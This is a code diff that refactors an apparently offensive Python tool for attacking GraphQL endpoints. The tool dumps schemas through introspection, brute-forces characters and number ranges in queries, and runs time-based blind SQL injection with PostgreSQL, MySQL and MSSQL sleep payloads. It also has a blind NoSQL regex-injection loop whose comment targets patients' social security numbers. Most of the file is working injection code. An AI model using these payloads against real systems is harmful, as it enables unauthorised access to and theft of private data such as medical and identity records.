@@ -1,29 +1,24 @@
 #!/usr/bin/python
-import argparse
-import json
-import re
-import readline
-import requests
-import sys
-import time
 from utils import *
+
 
 def display_types(URL, method, headers):
     payload = "{__schema{types{name}}}"
     r = requester(URL, method, payload, headers)
-    if r != None:
+    if r is not None:
         schema = r.json()
         for names in schema['data']['__schema']['types']:
             print(names)
 
 
-def dump_schema(URL, method, graphversion, headers):
+def dump_schema(url, method, graphversion, headers):
     """
         Dump the GraphQL schema via Instrospection
 
-        :param URL: URL of the GraphQL instance
+        :param headers: Headers to use
+        :param url: URL of the GraphQL instance
         :param method: HTTP method to use
-        :param graphversion: GraphQL version        
+        :param graphversion: GraphQL version
         :return: None
     """
 
@@ -32,7 +27,7 @@ def dump_schema(URL, method, graphversion, headers):
     else:
         payload = "fragment+FullType+on+__Type+{++kind++name++description++fields(includeDeprecated:+true)+{++++name++++description++++args+{++++++...InputValue++++}++++type+{++++++...TypeRef++++}++++isDeprecated++++deprecationReason++}++inputFields+{++++...InputValue++}++interfaces+{++++...TypeRef++}++enumValues(includeDeprecated:+true)+{++++name++++description++++isDeprecated++++deprecationReason++}++possibleTypes+{++++...TypeRef++}}fragment+InputValue+on+__InputValue+{++name++description++type+{++++...TypeRef++}++defaultValue}fragment+TypeRef+on+__Type+{++kind++name++ofType+{++++kind++++name++++ofType+{++++++kind++++++name++++++ofType+{++++++++kind++++++++name++++++++ofType+{++++++++++kind++++++++++name++++++++++ofType+{++++++++++++kind++++++++++++name++++++++++++ofType+{++++++++++++++kind++++++++++++++name++++++++++++++ofType+{++++++++++++++++kind++++++++++++++++name++++++++++++++}++++++++++++}++++++++++}++++++++}++++++}++++}++}}query+IntrospectionQuery+{++__schema+{++++queryType+{++++++name++++}++++mutationType+{++++++name++++}++++types+{++++++...FullType++++}++++directives+{++++++name++++++description++++++locations++++++args+{++++++++...InputValue++++++}++++}++}}"
 
-    r = requester(URL, method, payload, headers)
+    r = requester(url, method, payload, headers)
     schema = r.json()
 
     print("============= [SCHEMA] ===============")
@@ -42,33 +37,31 @@ def dump_schema(URL, method, graphversion, headers):
         if types['kind'] == "OBJECT":
             print(types['name'])
 
-            if not "__" in types['name']:
+            if "__" not in types['name']:
                 for fields in types['fields']:
                     field_type = ""
                     try:
                         field_type = fields['type']['ofType']['name']
-                    except Exception as e :
+                    except Exception:
                         pass
 
                     print("\t\033[92m{}\033[0m[\033[94m{}\033[0m]: ".format(fields['name'], field_type), end='')
 
-
                     # add the field to the autocompleter
                     cmdlist.append(fields['name'])
-                    
+
                     for args in fields['args']:
                         args_name = args.get('name')
-                        args_tkind = ""
                         args_ttype = ""
 
                         try:
-                            args_tkind = args['type']['kind']
-                        except:
+                            args['type']['kind']
+                        except Exception:
                             pass
 
                         try:
                             args_ttype = args['type']['ofType']['name']
-                        except Exception as e:
+                        except Exception:
                             pass
 
                         print("{} (\033[93m{}\033[0m!), ".format(args_name, args_ttype), end='')
@@ -77,15 +70,17 @@ def dump_schema(URL, method, graphversion, headers):
                     print("")
 
 
-def exec_graphql(URL, method, query, headers={}, only_length=0):
-    r = requester(URL, method, query, headers)
+def exec_graphql(url, method, query, headers=None, only_length=0):
+    if headers is None:
+        headers = {}
+    r = requester(url, method, query, headers)
     try:
         graphql = r.json()
         errors = graphql.get("errors")
 
         # handle errors in JSON data
-        if(errors):
-            return ("\033[91m" + errors[0]['message'] + "\033[0m")
+        if errors:
+            return "\033[91m" + errors[0]['message'] + "\033[0m"
 
         else:
             try:
@@ -93,30 +88,31 @@ def exec_graphql(URL, method, query, headers={}, only_length=0):
 
                 # handle blind injection (content length)
                 if only_length:
-                    return (len(jq_data))
+                    return len(jq_data)
 
                 # otherwise return the JSON content
                 else:
-                    return (jq(graphql))
-                    
+                    return jq(graphql)
+
             except:
                 # when the content isn't a valid JSON, return a text
-                return (r.text)
+                return r.text
 
     except Exception as e:
         return "\033[91m[!]\033[0m {}".format(str(e))
-    
 
-def exec_advanced(URL, method, query, headers):
+
+def exec_advanced(url, method, query, headers):
     print(query)
 
     # Allow a user to bruteforce character from a charset
-    # e.g: {doctors(options: 1, search: "{ \"lastName\": { \"$regex\": \"AdmiGRAPHQL_CHARSET\"} }"){firstName lastName id}}   
+    # e.g: {doctors(options: 1, search: "{ \"lastName\": { \"$regex\": \"AdmiGRAPHQL_CHARSET\"} }"){firstName lastName id}}
     if "GRAPHQL_CHARSET" in query:
-        GRAPHQL_CHARSET = "!$%\'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[]^_`abcdefghijklmnopqrstuvwxyz{|}~"
-        for c in GRAPHQL_CHARSET:
-            length = exec_graphql(URL, method, query.replace("GRAPHQL_CHARSET", c), headers, only_length=1)
-            print("[+] \033[92mQuery\033[0m: (\033[91m{}\033[0m) {}".format(length, query.replace("GRAPHQL_CHARSET", c)))
+        graphql_charset = "!$%\'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[]^_`abcdefghijklmnopqrstuvwxyz{|}~"
+        for c in graphql_charset:
+            length = exec_graphql(url, method, query.replace("GRAPHQL_CHARSET", c), headers, only_length=1)
+            print(
+                "[+] \033[92mQuery\033[0m: (\033[91m{}\033[0m) {}".format(length, query.replace("GRAPHQL_CHARSET", c)))
 
 
     # Allow a user to bruteforce number from a specified range
@@ -127,40 +123,42 @@ def exec_advanced(URL, method, query, headers):
 
         for i in range(int(match[0])):
             pattern = "GRAPHQL_INCREMENT_" + match[0]
-            length = exec_graphql(URL, method, query.replace(pattern, str(i)), headers, only_length=1)
+            length = exec_graphql(url, method, query.replace(pattern, str(i)), headers, only_length=1)
             print("[+] \033[92mQuery\033[0m: (\033[91m{}\033[0m) {}".format(length, query.replace(pattern, str(i))))
 
     # Otherwise execute the query and display the JSON result
     else:
-        print(exec_graphql(URL, method, query, headers))
-            
+        print(exec_graphql(url, method, query, headers))
 
-def blind_postgresql(URL, method, headers):
+
+def blind_postgresql(url, method, headers):
     query = input("Query > ")
     payload = "1 AND pg_sleep(30) --"
-    print("\033[92m[+] Started at: {}\033[0m".format(time.asctime( time.localtime(time.time()))))
-    injected = (URL.format(query)).replace("BLIND_PLACEHOLDER", payload)
-    r = requester(URL, method, injected, headers)
-    print("\033[92m[+] Ended at: {}\033[0m".format(time.asctime( time.localtime(time.time()))))
+    print("\033[92m[+] Started at: {}\033[0m".format(time.asctime(time.localtime(time.time()))))
+    injected = (url.format(query)).replace("BLIND_PLACEHOLDER", payload)
+    requester(url, method, injected, headers)
+    print("\033[92m[+] Ended at: {}\033[0m".format(time.asctime(time.localtime(time.time()))))
 
-def blind_mysql(URL, method, headers):
+
+def blind_mysql(url, method, headers):
     query = input("Query > ")
     payload = "'-SLEEP(30); #"
-    print("\033[92m[+] Started at: {}\033[0m".format(time.asctime( time.localtime(time.time()))))
-    injected = (URL.format(query)).replace("BLIND_PLACEHOLDER", payload)
-    r = requester(URL, method, injected, headers)
-    print("\033[92m[+] Ended at: {}\033[0m".format(time.asctime( time.localtime(time.time()))))
+    print("\033[92m[+] Started at: {}\033[0m".format(time.asctime(time.localtime(time.time()))))
+    injected = (url.format(query)).replace("BLIND_PLACEHOLDER", payload)
+    requester(url, method, injected, headers)
+    print("\033[92m[+] Ended at: {}\033[0m".format(time.asctime(time.localtime(time.time()))))
 
-def blind_mssql(URL, method, headers):
+
+def blind_mssql(url, method, headers):
     query = input("Query > ")
     payload = "'; WAITFOR DELAY '00:00:30';"
-    print("\033[92m[+] Started at: {}\033[0m".format(time.asctime( time.localtime(time.time()))))
-    injected = (URL.format(query)).replace("BLIND_PLACEHOLDER", payload)
-    r = requester(URL, method, injected, headers)
-    print("\033[92m[+] Ended at: {}\033[0m".format(time.asctime( time.localtime(time.time()))))
+    print("\033[92m[+] Started at: {}\033[0m".format(time.asctime(time.localtime(time.time()))))
+    injected = (url.format(query)).replace("BLIND_PLACEHOLDER", payload)
+    requester(url, method, injected, headers)
+    print("\033[92m[+] Ended at: {}\033[0m".format(time.asctime(time.localtime(time.time()))))
 
 
-def blind_nosql(URL, method, headers):
+def blind_nosql(url, method, headers):
     # Query : {doctors(options: "{\"\"patients.ssn\":1}", search: "{ \"patients.ssn\": { \"$regex\": \"^BLIND_PLACEHOLDER\"}, \"lastName\":\"Admin\" , \"firstName\":\"Admin\" }"){id, firstName}}
     # Check : "5d089c51dcab2d0032fdd08d"
 
@@ -173,7 +171,7 @@ def blind_nosql(URL, method, headers):
     while len(data) != data_size:
         for c in charset:
             injected = query.replace("BLIND_PLACEHOLDER", data + c)
-            r = requester(URL, method, injected, headers)
+            r = requester(url, method, injected, headers)
             if check in r.text:
                 data += c
 
